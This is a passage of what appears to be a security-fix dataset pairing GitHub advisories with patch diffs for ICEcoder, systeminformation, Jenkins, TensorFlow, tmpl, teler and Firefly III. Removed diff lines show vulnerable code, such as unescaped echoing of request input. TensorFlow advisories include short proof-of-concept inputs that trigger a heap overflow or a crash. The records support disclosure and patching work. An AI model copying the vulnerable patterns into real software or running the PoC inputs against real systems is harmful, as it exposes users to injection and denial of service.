\\'\">\\' + spansArray[i].innerHTML +\\n                         \\', <?php echo $t[\\'rename to\\'];?> \\' +\\n-                        targetURL.replace(\/\\\\|\/g, \"\/\").replace(\/_perms\/g, \"\").replace(\/<?php echo str_replace(\"\/\", \"\\\\\/\",strtolower($findText)); ?>\/g,\"<b><?php\\n-                            if (isset($_GET[\\'replace\\'])) {echo $_GET[\\'replace\\'];};\\n+                        targetURL.replace(\/\\\\|\/g, \"\/\").replace(\/_perms\/g, \"\").replace(\/<?php echo str_replace(\"\/\", \"\\\\\/\",strtolower(preg_quote($findText))); ?>\/g,\"<b><?php\\n+                            if (isset($_GET[\\'replace\\'])) {echo str_replace(\"&amp;\", \"&\", xssClean($_GET[\\'replace\\'], \\'script\\'));};\\n                         ?><\/b>\")+\\'<\/div>\\';\\n                         <?php\\n                         ;};\\n@@ -253,7 +256,7 @@ function phpGrep($q, $path, $base) {\\n \\n     const replaceInFileSingle = function(fileRef) {\\n         \/\/ TODO: findText in this line\\n-        parent.ICEcoder.replaceInFile(fileRef, true === parent.ICEcoder.findRegex ? findText : parent.ICEcoder.escapeRegex(findText), \\'<?php if (isset($_GET[\\'replace\\'])) {echo $_GET[\\'replace\\'];}; ?>\\');\\n+        parent.ICEcoder.replaceInFile(fileRef, true === parent.ICEcoder.findRegex ? findText : parent.ICEcoder.escapeRegex(findText), \\'<?php if (isset($_GET[\\'replace\\'])) {echo xssClean($_GET[\\'replace\\'], \\'script\\');}; ?>\\');\\n     };\\n \\n     const replaceInFilesAll = function() {\\n@@ -267,7 +270,7 @@ function phpGrep($q, $path, $base) {\\n         fileRef = spansArray[arrayRef].id.replace(\/\\\\|\/g, \"\/\").replace(\/_perms\/g, \"\");\\n         const rExp = new RegExp(true === parent.ICEcoder.findRegex ? findText : parent.ICEcoder.escapeRegex(findText), \"gi\");\\n         \/\/ TODO: get this working\\n-        newName = spansArray[arrayRef].id.replace(\/\\\\|\/g, \"\/\").replace(\/_perms\/g, \"\").replace(rExp, \"<?php if (isset($_GET[\\'replace\\'])) {echo $_GET[\\'replace\\'];}; ?>\");\\n+        newName = spansArray[arrayRef].id.replace(\/\\\\|\/g, \"\/\").replace(\/_perms\/g, \"\").replace(rExp, \"<?php if (isset($_GET[\\'replace\\'])) {echo xssClean($_GET[\\'replace\\'], \\'script\\');}; ?>\");\\n         parent.ICEcoder.renameFile(fileRef,newName);\\n     };'}}","message_norm":"xss and usage fixes on multiple-results.php","language":"en","entities":"[('xss', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/multiple-results.php'])","num_files":1.0},{"index":2239,"vuln_id":"GHSA-jff2-qjw8-5476","cwe_id":"{'CWE-77', 'CWE-78'}","score":8.9,"chain":"{'https:\/\/github.com\/sebhildebrandt\/systeminformation\/commit\/01ef56cd5824ed6da1c11b37013a027fdef67524', 'https:\/\/github.com\/sebhildebrandt\/systeminformation\/commit\/0be6fcd575c05687d1076d5cd6d75af2ebae5a46', 'https:\/\/github.com\/sebhildebrandt\/systeminformation\/commit\/7922366d707de7f20995fc8e30ac3153636bf35f'}","dataset":"osv","summary":"Command Injection Vulnerability in systeminformation ### Impact\ncommand injection vulnerability\n\n### Patches\nProblem was fixed with a parameter check. Please upgrade to version >= 5.6.4\n\n### Workarounds\nIf you cannot upgrade, be sure to check or sanitize service parameters that are passed to si.inetLatency(), si.inetChecksite(), si.services(), si.processLoad() ... do only allow strings, reject any arrays. String sanitation works as expected.","published_date":"2021-04-06","chain_len":3,"project":"https:\/\/github.com\/sebhildebrandt\/systeminformation","commit_href":"https:\/\/github.com\/sebhildebrandt\/systeminformation\/commit\/01ef56cd5824ed6da1c11b37013a027fdef67524","commit_sha":"01ef56cd5824ed6da1c11b37013a027fdef67524","patch":"MULTI","chain_ord":"['7922366d707de7f20995fc8e30ac3153636bf35f', '0be6fcd575c05687d1076d5cd6d75af2ebae5a46', '01ef56cd5824ed6da1c11b37013a027fdef67524']","before_first_fix_commit":"{'0be6fcd575c05687d1076d5cd6d75af2ebae5a46'}","last_fix_commit":"01ef56cd5824ed6da1c11b37013a027fdef67524","chain_ord_pos":3.0,"commit_datetime":"03\/15\/2021, 10:51:30","message":"sanitizeShellString() and other security improvements","author":"Sebastian Hildebrandt","comments":"{'com_1': {'author': 'Aaisui', 'datetime': '06\/24\/2021, 03:57:58', 'body': \"In fact,I think the previous version is also safe,i try to do something bad but can't bypass  sanitizeShellString !! :( @sebhildebrandt\"}, 'com_2': {'author': 'Aaisui', 'datetime': '06\/24\/2021, 04:01:11', 'body': \"> In fact, I think the previous version is also safe, I try to do something bad but can't bypass sanitizeShellString !! :( @sebhildebrandt\\r\\n\\r\\nI hope you can give some trick for me XDDDD\"}}","stats":"{'additions': 3, 'deletions': 4, 'total': 7}","files":"{'lib\/internet.js': {'additions': 3, 'deletions': 4, 'changes': 7, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/sebhildebrandt\/systeminformation\/raw\/01ef56cd5824ed6da1c11b37013a027fdef67524\/lib%2Finternet.js', 'patch': \"@@ -14,7 +14,6 @@\\n \/\/ ----------------------------------------------------------------------------------\\n \\n \/\/ const exec = require('child_process').exec;\\n-const execFile = require('child_process').execFile;\\n const util = require('.\/util');\\n \\n let _platform = process.platform;\\n@@ -213,9 +212,9 @@ function inetLatency(host, callback) {\\n         let result = null;\\n         try {\\n           const params = hostSanitized + ' -n 1';\\n-          execFile('ping', params.split(' '), util.execOptsWin, function (error, stdout) {\\n-            if (!error) {\\n-              let lines = stdout.toString().split('\\\\r\\\\n');\\n+          util.execSave('ping', params.split(' '), util.execOptsWin).then((stdout) => {\\n+            if (stdout) {\\n+              let lines = stdout.split('\\\\r\\\\n');\\n               lines.shift();\\n               lines.forEach(function (line) {\\n                 if ((line.toLowerCase().match(\/ms\/g) || []).length === 3) {\"}}","message_norm":"sanitizeshellstring() and other security improvements","language":"en","entities":"[('sanitizeshellstring', 'SECWORD', ''), ('security', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/internet.js'])","num_files":1.0},{"index":2243,"vuln_id":"GHSA-jff5-55xj-4jcq","cwe_id":"{'CWE-79'}","score":5.4,"chain":"{'https:\/\/github.com\/jenkinsci\/jenkins\/commit\/307ed31caba68a46426b8c73a787a05add2c7489'}","dataset":"osv","summary":"Improper Neutralization of Input During Web Page Generation in Jenkins jenkins before versions 2.44, 2.32.2 is vulnerable to a persisted cross-site scripting in search suggestions due to improperly escaping users with less-than and greater-than characters in their names (SECURITY-388).","published_date":"2022-05-13","chain_len":1,"project":"https:\/\/github.com\/jenkinsci\/jenkins","commit_href":"https:\/\/github.com\/jenkinsci\/jenkins\/commit\/307ed31caba68a46426b8c73a787a05add2c7489","commit_sha":"307ed31caba68a46426b8c73a787a05add2c7489","patch":"SINGLE","chain_ord":"['307ed31caba68a46426b8c73a787a05add2c7489']","before_first_fix_commit":"{'97a61a9fe55f4c16168c123f98301a5173b9fa86', '7ae469770fd10c79bebc07511cd0ab1cafd33292'}","last_fix_commit":"307ed31caba68a46426b8c73a787a05add2c7489","chain_ord_pos":1.0,"commit_datetime":"01\/10\/2017, 22:21:40","message":"Merge pull request #98 from jenkinsci-cert\/SECURITY-388\n\n[SECURITY-388] Escape metacharacters in the search box","author":"Jesse Glick","comments":null,"stats":"{'additions': 1, 'deletions': 0, 'total': 1}","files":"{'war\/src\/main\/webapp\/scripts\/hudson-behavior.js': {'additions': 1, 'deletions': 0, 'changes': 1, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/jenkinsci\/jenkins\/raw\/307ed31caba68a46426b8c73a787a05add2c7489\/war%2Fsrc%2Fmain%2Fwebapp%2Fscripts%2Fhudson-behavior.js', 'patch': '@@ -2168,6 +2168,7 @@ function createSearchBox(searchURL) {\\n     var ac = new YAHOO.widget.AutoComplete(\"search-box\",\"search-box-completion\",ds);\\n     ac.typeAhead = false;\\n     ac.autoHighlight = false;\\n+    ac.formatResult = ac.formatEscapedResult;\\n \\n     var box   = $(\"search-box\");\\n     var sizer = $(\"search-box-sizer\");'}}","message_norm":"merge pull request #98 from jenkinsci-cert\/security-388\n\n[security-388] escape metacharacters in the search box","language":"en","entities":"[('#98', 'ISSUE', ''), ('security-388', 'SECWORD', ''), ('security-388', 'SECWORD', ''), ('escape', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['war\/src\/main\/webapp\/scripts\/hudson-behavior.js'])","num_files":1.0},{"index":2244,"vuln_id":"GHSA-jfp7-4j67-8r3q","cwe_id":"{'CWE-193', 'CWE-131'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f851613f8f0fb0c838d160ced13c134f778e3ce7'}","dataset":"osv","summary":"Heap buffer overflow caused by rounding ### Impact\nAn attacker can trigger a heap buffer overflow in `tf.raw_ops.QuantizedResizeBilinear` by manipulating input values so that float rounding results in off-by-one error in accessing image elements:\n\n```python\nimport tensorflow as tf\n\nl = [256, 328, 361, 17, 361, 361, 361, 361, 361, 361, 361, 361, 361, 361, 384]\nimages = tf.constant(l, shape=[1, 1, 15, 1], dtype=tf.qint32)\nsize = tf.constant([12, 6], shape=[2], dtype=tf.int32)\nmin = tf.constant(80.22522735595703)\nmax = tf.constant(80.39215850830078)\n\ntf.raw_ops.QuantizedResizeBilinear(images=images, size=size, min=min, max=max,\n                                   align_corners=True, half_pixel_centers=True)\n```\n\nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/44b7f486c0143f68b56c34e2d01e146ee445134a\/tensorflow\/core\/kernels\/quantized_resize_bilinear_op.cc#L62-L66) computes two integers (representing the upper and lower bounds for interpolation) by ceiling and flooring a floating point value:\n\n```cc\nconst float in_f = std::floor(in);\ninterpolation->lower[i] = std::max(static_cast<int64>(in_f), static_cast<int64>(0));\ninterpolation->upper[i] = std::min(static_cast<int64>(std::ceil(in)), in_size - 1);\n```\n  \nFor some values of `in`, `interpolation->upper[i]` might be smaller than `interpolation->lower[i]`. This is an issue if `interpolation->upper[i]` is capped at `in_size-1` as it means that `interpolation->lower[i]` points outside of the image. Then, [in the interpolation code](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/44b7f486c0143f68b56c34e2d01e146ee445134a\/tensorflow\/core\/kernels\/quantized_resize_bilinear_op.cc#L245-L264), this would result in heap buffer overflow:\n\n```cc\ntemplate <int RESOLUTION, typename T, typename T_SCALE, typename T_CALC>\ninline void OutputLerpForChannels(const InterpolationCache<T_SCALE>& xs,\n                                  const int64 x, const T_SCALE ys_ilerp,\n                                  const int channels, const float min,\n                                  const float max, const T* ys_input_lower_ptr,\n                                  const T* ys_input_upper_ptr,\n                                  T* output_y_ptr) {\n  const int64 xs_lower = xs.lower[x];\n  ...\n  for (int c = 0; c < channels; ++c) {\n    const T top_left = ys_input_lower_ptr[xs_lower + c];\n    ...\n  }\n}\n```\n\nFor the other cases where `interpolation->upper[i]` is smaller than `interpolation->lower[i]`, we can set them to be equal without affecting the output.\n\n### Patches\nWe have patched the issue in GitHub commit [f851613f8f0fb0c838d160ced13c134f778e3ce7](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f851613f8f0fb0c838d160ced13c134f778e3ce7).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f851613f8f0fb0c838d160ced13c134f778e3ce7","commit_sha":"f851613f8f0fb0c838d160ced13c134f778e3ce7","patch":"SINGLE","chain_ord":"['f851613f8f0fb0c838d160ced13c134f778e3ce7']","before_first_fix_commit":"{'44b7f486c0143f68b56c34e2d01e146ee445134a'}","last_fix_commit":"f851613f8f0fb0c838d160ced13c134f778e3ce7","chain_ord_pos":1.0,"commit_datetime":"04\/21\/2021, 23:20:48","message":"Fix heap buffer overflow caused by rounding.\n\nThis was hard to fix. Due to the way we compute the pixels that influence an output pixel in resized images, for certain input configuration we might have issued a read to a pixel that is outside of boundary of the original image. This is because of floating errors that affected truncation results.\n\nPiperOrigin-RevId: 369757871\nChange-Id: If89425fff930983829a2168203c11858883eebc9","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'tensorflow\/core\/kernels\/quantized_resize_bilinear_op.cc': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/f851613f8f0fb0c838d160ced13c134f778e3ce7\/tensorflow%2Fcore%2Fkernels%2Fquantized_resize_bilinear_op.cc', 'patch': '@@ -64,6 +64,8 @@ inline void ComputeInterpolationWeights(\\n         std::max(static_cast<int64>(in_f), static_cast<int64>(0));\\n     interpolation->upper[i] =\\n         std::min(static_cast<int64>(std::ceil(in)), in_size - 1);\\n+    interpolation->lower[i] =\\n+        std::min(interpolation->lower[i], interpolation->upper[i]);\\n     interpolation->lerp[i] = in - in_f;\\n     interpolation->ilerp[i] =\\n         static_cast<T_SCALE>((in - in_f) * (1 << resolution));'}}","message_norm":"fix heap buffer overflow caused by rounding.\n\nthis was hard to fix. due to the way we compute the pixels that influence an output pixel in resized images, for certain input configuration we might have issued a read to a pixel that is outside of boundary of the original image. this is because of floating errors that affected truncation results.\n\npiperorigin-revid: 369757871\nchange-id: if89425fff930983829a2168203c11858883eebc9","language":"en","entities":"[('fix', 'ACTION', ''), ('buffer overflow', 'SECWORD', ''), ('fix', 'ACTION', ''), ('outside of boundary', 'SECWORD', ''), ('errors', 'FLAW', ''), ('369757871', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/quantized_resize_bilinear_op.cc'])","num_files":1.0},{"index":2252,"vuln_id":"GHSA-jgrx-mgxx-jf9v","cwe_id":"{'CWE-400'}","score":7.5,"chain":"{'https:\/\/github.com\/daaku\/nodejs-tmpl\/commit\/4c654e4d1542f329ed561fd95ccd80f30c6872d6'}","dataset":"osv","summary":"tmpl vulnerable to Inefficient Regular Expression Complexity which may lead to resource exhaustion nodejs-tmpl is simple string formatting. tmpl is vulnerable to Inefficient Regular Expression Complexity which may lead to resource exhaustion.","published_date":"2021-09-20","chain_len":1,"project":"https:\/\/github.com\/daaku\/nodejs-tmpl","commit_href":"https:\/\/github.com\/daaku\/nodejs-tmpl\/commit\/4c654e4d1542f329ed561fd95ccd80f30c6872d6","commit_sha":"4c654e4d1542f329ed561fd95ccd80f30c6872d6","patch":"SINGLE","chain_ord":"['4c654e4d1542f329ed561fd95ccd80f30c6872d6']","before_first_fix_commit":"{'1dbd350783f04743bd759cc5ae1e1e3633d550ff'}","last_fix_commit":"4c654e4d1542f329ed561fd95ccd80f30c6872d6","chain_ord_pos":1.0,"commit_datetime":"09\/07\/2021, 06:41:06","message":"fix potential dos in regex","author":"Naitik Shah","comments":null,"stats":"{'additions': 1, 'deletions': 1, 'total': 2}","files":"{'lib\/tmpl.js': {'additions': 1, 'deletions': 1, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/daaku\/nodejs-tmpl\/raw\/4c654e4d1542f329ed561fd95ccd80f30c6872d6\/lib%2Ftmpl.js', 'patch': \"@@ -1,4 +1,4 @@\\n-var INTERPOLATE = \/{([\\\\s\\\\S]+?)}\/g\\n+var INTERPOLATE = \/{([^{]+?)}\/g\\n \\n module.exports = function(str, data) {\\n   var tmpl = 'var __p=[],print=function(){__p.push.apply(__p,arguments);};' +\"}}","message_norm":"fix potential dos in regex","language":"ca","entities":"[('fix', 'ACTION', ''), ('dos', 'SECWORD', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['lib\/tmpl.js'])","num_files":1.0},{"index":2255,"vuln_id":"GHSA-jhj6-5mh6-4pvf","cwe_id":"{'CWE-476'}","score":7.5,"chain":"{'https:\/\/github.com\/kitabisa\/teler\/commit\/ec6082049dba9e44a21f35fb7b123d42ce1a1a7e'}","dataset":"osv","summary":"Denial-of-Service within Docker container ### Impact\nIf you run teler inside a Docker container and encounter `errors.Exit` function, it will cause denial-of-service (`SIGSEGV`) because it doesn't get process ID and process group ID of teler properly to kills.\n\n### Patches\nUpgrade to the >= 0.0.1 version.\n\n### Workarounds\nN\/A\n\n### References\n- https:\/\/github.com\/kitabisa\/teler\/commit\/ec6082049dba9e44a21f35fb7b123d42ce1a1a7e\n\n### For more information\nIf you have any questions or comments about this advisory:\n* Open an issue in [Issues Section](https:\/\/github.com\/kitabisa\/teler\/issues)\n* Email us at [infosec@kitabisa.com](mailto:infosec@kitabisa.com)","published_date":"2021-05-24","chain_len":1,"project":"https:\/\/github.com\/kitabisa\/teler","commit_href":"https:\/\/github.com\/kitabisa\/teler\/commit\/ec6082049dba9e44a21f35fb7b123d42ce1a1a7e","commit_sha":"ec6082049dba9e44a21f35fb7b123d42ce1a1a7e","patch":"SINGLE","chain_ord":"['ec6082049dba9e44a21f35fb7b123d42ce1a1a7e']","before_first_fix_commit":"{'7be1cb4511a8236d5203a924bc0aa4db008aafb8'}","last_fix_commit":"ec6082049dba9e44a21f35fb7b123d42ce1a1a7e","chain_ord_pos":1.0,"commit_datetime":"11\/02\/2020, 14:09:38","message":":hammer: Fix segmentation fault of syscall\n\nIf teler is run via the docker image, the syscall function cannot allocate and return a nil pointer to address.","author":"Dwi Siswanto","comments":null,"stats":"{'additions': 8, 'deletions': 1, 'total': 9}","files":"{'pkg\/errors\/abort.go': {'additions': 8, 'deletions': 1, 'changes': 9, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/kitabisa\/teler\/raw\/ec6082049dba9e44a21f35fb7b123d42ce1a1a7e\/pkg%2Ferrors%2Fabort.go', 'patch': '@@ -2,10 +2,17 @@\\n \\n package errors\\n \\n-import \"syscall\"\\n+import (\\n+\\t\"os\"\\n+\\t\"syscall\"\\n+)\\n \\n \/\/ Abort will terminate & sends SIGTERM to process\\n func Abort(i ...int) {\\n+\\tif _, err := os.Stat(\"\/.dockerenv\"); err == nil {\\n+\\t\\tos.Exit(i[0])\\n+\\t}\\n+\\n \\tpgid, err := syscall.Getpgid(syscall.Getpid())\\n \\tif err != nil {\\n \\t\\tExit(err.Error())'}}","message_norm":":hammer: fix segmentation fault of syscall\n\nif teler is run via the docker image, the syscall function cannot allocate and return a nil pointer to address.","language":"en","entities":"[('segmentation fault', 'SECWORD', ''), ('address', 'ACTION', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['pkg\/errors\/abort.go'])","num_files":1.0},{"index":2256,"vuln_id":"GHSA-jhq9-wm9m-cf89","cwe_id":"{'CWE-617'}","score":2.5,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/704866eabe03a9aeda044ec91a8d0c83fc1ebdbe'}","dataset":"osv","summary":"CHECK-failure in `UnsortedSegmentJoin` ### Impact\nAn attacker can cause a denial of service by controlling the values of `num_segments` tensor argument for `UnsortedSegmentJoin`:\n\n```python\nimport tensorflow as tf\n\ninputs = tf.constant([], dtype=tf.string)\nsegment_ids = tf.constant([], dtype=tf.int32)\nnum_segments = tf.constant([], dtype=tf.int32)\nseparator = ''\n\ntf.raw_ops.UnsortedSegmentJoin(\n  inputs=inputs, segment_ids=segment_ids,\n  num_segments=num_segments, separator=separator)\n```\n\nThis is because the [implementation](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/a2a607db15c7cd01d754d37e5448d72a13491bdb\/tensorflow\/core\/kernels\/unsorted_segment_join_op.cc#L92-L93) assumes that the `num_segments` tensor is a valid scalar:\n\n```cc\nconst Tensor& num_segments_tensor = context->input(2);\nauto num_segments = num_segments_tensor.scalar<NUM_SEGMENTS_TYPE>()();\n```\n\nSince the tensor is empty the `CHECK` involved in `.scalar<T>()()` that checks that the number of elements is exactly 1 will be invalidated and this would result in process termination.\n\n### Patches\nWe have patched the issue in GitHub commit [704866eabe03a9aeda044ec91a8d0c83fc1ebdbe](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/704866eabe03a9aeda044ec91a8d0c83fc1ebdbe).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by Ying Wang and Yakun Zhang of Baidu X-Team.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/704866eabe03a9aeda044ec91a8d0c83fc1ebdbe","commit_sha":"704866eabe03a9aeda044ec91a8d0c83fc1ebdbe","patch":"SINGLE","chain_ord":"['704866eabe03a9aeda044ec91a8d0c83fc1ebdbe']","before_first_fix_commit":"{'a2a607db15c7cd01d754d37e5448d72a13491bdb'}","last_fix_commit":"704866eabe03a9aeda044ec91a8d0c83fc1ebdbe","chain_ord_pos":1.0,"commit_datetime":"04\/27\/2021, 21:41:40","message":"Fix overflow CHECK issue with `tf.raw_ops.UnsortedSegmentJoin`.\n\nPiperOrigin-RevId: 370766155\nChange-Id: I33e7c6626224e1060a8a4ab51ad5d861c6d4c63e","author":"Amit Patankar","comments":null,"stats":"{'additions': 2, 'deletions': 0, 'total': 2}","files":"{'tensorflow\/core\/kernels\/unsorted_segment_join_op.cc': {'additions': 2, 'deletions': 0, 'changes': 2, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/704866eabe03a9aeda044ec91a8d0c83fc1ebdbe\/tensorflow%2Fcore%2Fkernels%2Funsorted_segment_join_op.cc', 'patch': '@@ -90,6 +90,8 @@ class UnsortedSegmentJoinOp : public OpKernel {\\n     const int32 segment_dims = segment_id_shape.dims();\\n \\n     const Tensor& num_segments_tensor = context->input(2);\\n+    OP_REQUIRES(context, num_segments_tensor.NumElements() != 0,\\n+                errors::InvalidArgument(\"Number of segments cannot be empty.\"));\\n     auto num_segments = num_segments_tensor.scalar<NUM_SEGMENTS_TYPE>()();\\n \\n     OP_REQUIRES(context, segment_dims != 0,'}}","message_norm":"fix overflow check issue with `tf.raw_ops.unsortedsegmentjoin`.\n\npiperorigin-revid: 370766155\nchange-id: i33e7c6626224e1060a8a4ab51ad5d861c6d4c63e","language":"en","entities":"[('fix', 'ACTION', ''), ('overflow', 'SECWORD', ''), ('issue', 'FLAW', ''), ('370766155', 'SHA', 'generic_sha')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['tensorflow\/core\/kernels\/unsorted_segment_join_op.cc'])","num_files":1.0},{"index":2261,"vuln_id":"GHSA-jjcx-999m-35hc","cwe_id":"{'CWE-20'}","score":3.3,"chain":"{'https:\/\/github.com\/firefly-iii\/firefly-iii\/commit\/e80d616ef4397e6e764f6b7b7a5b30121244933c'}","dataset":"osv","summary":"Improper Input Validation in Firefly III Firefly III 4.7.17.3 is vulnerable to local file enumeration. An attacker can enumerate local files due to the lack of protocol scheme sanitization, such as for file:\/\/\/ URLs. This is related to fints_url to import\/job\/configuration, and import\/create\/fints.","published_date":"2021-09-08","chain_len":1,"project":"https:\/\/github.com\/firefly-iii\/firefly-iii","commit_href":"https:\/\/github.com\/firefly-iii\/firefly-iii\/commit\/e80d616ef4397e6e764f6b7b7a5b30121244933c","commit_sha":"e80d616ef4397e6e764f6b7b7a5b30121244933c","patch":"SINGLE","chain_ord":"['e80d616ef4397e6e764f6b7b7a5b30121244933c']","before_first_fix_commit":"{'2ddf48f15cbdbb475221c299872420f625c3bc3f'}","last_fix_commit":"e80d616ef4397e6e764f6b7b7a5b30121244933c","chain_ord_pos":1.0,"commit_datetime":"08\/02\/2019, 15:05:54","message":"Fix #2367","author":"James Cole","comments":null,"stats":"{'additions': 20, 'deletions': 0, 'total': 20}","files":"{'app\/Support\/Import\/JobConfiguration\/FinTS\/NewFinTSJobHandler.php': {'additions': 20, 'deletions': 0, 'changes': 20, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/firefly-iii\/firefly-iii\/raw\/e80d616ef4397e6e764f6b7b7a5b30121244933c\/app%2FSupport%2FImport%2FJobConfiguration%2FFinTS%2FNewFinTSJobHandler.php', 'patch': \"@@ -60,6 +60,9 @@ public function configureJob(array $data): MessageBag\\n         $config['fints_password']  = (string)(Crypt::encrypt($data['fints_password']) ?? '');\\n         $config['apply-rules']     = 1 === (int)$data['apply_rules'];\\n \\n+        \/\/ sanitize FinTS URL.\\n+        $config['fints_url'] = $this->validURI($config['fints_url']) ? $config['fints_url'] : '';\\n+\\n         $this->repository->setConfiguration($this->importJob, $config);\\n \\n \\n@@ -108,4 +111,21 @@ public function setImportJob(ImportJob $importJob): void\\n         $this->repository->setUser($importJob->user);\\n     }\\n \\n+    \/**\\n+     * @param string $fints_url\\n+     *\\n+     * @return bool\\n+     *\/\\n+    private function validURI(string $fintsUri): bool\\n+    {\\n+        $res = filter_var($fintsUri, FILTER_VALIDATE_URL);\\n+        if (false === $res) {\\n+            return false;\\n+        }\\n+        $scheme = parse_url($fintsUri, PHP_URL_SCHEME);\\n+\\n+        return 'https' === $scheme;\\n+    }\\n+\\n+\\n }\"}}","message_norm":"fix #2367","language":"ca","entities":"[('fix', 'ACTION', ''), ('#2367', 'ISSUE', '')]","classification_level_1":null,"classification_level_2":null,"list_files":"dict_keys(['app\/Support\/Import\/JobConfiguration\/FinTS\/NewFinTSJobHandler.php'])","num_files":1.0},{"index":2268,"vuln_id":"GHSA-jjr8-m8g8-p6wv","cwe_id":"{'CWE-476'}","score":4.4,"chain":"{'https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f8378920345f4f4604202d4ab15ef64b2aceaa16'}","dataset":"osv","summary":"Null pointer dereference in TFLite's `Reshape` operator ### Impact\nThe fix for [CVE-2020-15209](https:\/\/cve.mitre.org\/cgi-bin\/cvename.cgi?name=CVE-2020-15209) missed the case when the target shape of `Reshape` operator is given by the elements of a 1-D tensor. As such, the [fix for the vulnerability](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/9c1dc920d8ffb4893d6c9d27d1f039607b326743\/tensorflow\/lite\/core\/subgraph.cc#L1062-L1074) allowed passing a null-buffer-backed tensor with a 1D shape:\n\n```cc\nif (tensor->data.raw == nullptr && tensor->bytes > 0) {\n  if (registration.builtin_code == kTfLiteBuiltinReshape && i == 1) {\n    \/\/ In general, having a tensor here with no buffer will be an error.\n    \/\/ However, for the reshape operator, the second input tensor is only\n    \/\/ used for the shape, not for the data. Thus, null buffer is ok.\n    continue;\n  } else {\n    \/\/ In all other cases, we need to return an error as otherwise we will\n    \/\/ trigger a null pointer dereference (likely).\n    ReportError(\"Input tensor %d lacks data\", tensor_index);\n    return kTfLiteError;\n  }\n}\n```\n\n### Patches\nWe have patched the issue in GitHub commit [f8378920345f4f4604202d4ab15ef64b2aceaa16](https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f8378920345f4f4604202d4ab15ef64b2aceaa16).\n\nThe fix will be included in TensorFlow 2.5.0. We will also cherrypick this commit on TensorFlow 2.4.2, TensorFlow 2.3.3, TensorFlow 2.2.3 and TensorFlow 2.1.4, as these are also affected and still in supported range.\n\n### For more information\nPlease consult [our security guide](https:\/\/github.com\/tensorflow\/tensorflow\/blob\/master\/SECURITY.md) for more information regarding the security model and how to contact us with issues and questions.\n\n### Attribution\nThis vulnerability has been reported by members of the Aivul Team from Qihoo 360.","published_date":"2021-05-21","chain_len":1,"project":"https:\/\/github.com\/tensorflow\/tensorflow","commit_href":"https:\/\/github.com\/tensorflow\/tensorflow\/commit\/f8378920345f4f4604202d4ab15ef64b2aceaa16","commit_sha":"f8378920345f4f4604202d4ab15ef64b2aceaa16","patch":"SINGLE","chain_ord":"['f8378920345f4f4604202d4ab15ef64b2aceaa16']","before_first_fix_commit":"{'9c1dc920d8ffb4893d6c9d27d1f039607b326743'}","last_fix_commit":"f8378920345f4f4604202d4ab15ef64b2aceaa16","chain_ord_pos":1.0,"commit_datetime":"04\/28\/2021, 00:47:59","message":"Prevent a null pointer dereference in TFLite.\n\nPiperOrigin-RevId: 370800353\nChange-Id: Ic9c9712ce5c6e384c954dcd640a5bd9ff05c9a05","author":"Mihai Maruseac","comments":null,"stats":"{'additions': 10, 'deletions': 3, 'total': 13}","files":"{'tensorflow\/lite\/core\/subgraph.cc': {'additions': 10, 'deletions': 3, 'changes': 13, 'status': 'modified', 'raw_url': 'https:\/\/github.com\/tensorflow\/tensorflow\/raw\/f8378920345f4f4604202d4ab15ef64b2aceaa16\/tensorflow%2Flite%2Fcore%2Fsubgraph.cc', 'patch': '@@ -1060,10 +1060,17 @@ TfLiteStatus Subgraph::Invoke() {\\n         TF_LITE_ENSURE_STATUS(EnsureTensorDataIsReadable(tensor_index));\\n       }\\n       if (tensor->data.raw == nullptr && tensor->bytes > 0) {\\n-        if (registration.builtin_code == kTfLiteBuiltinReshape && i == 1) {\\n+        if (registration.builtin_code == kTfLiteBuiltinReshape && i == 1 &&\\n+            tensor->dims->size != 1) {\\n           \/\/ In general, having a tensor here with no buffer will be an error.\\n-          \/\/ However, for the reshape operator, the second input tensor 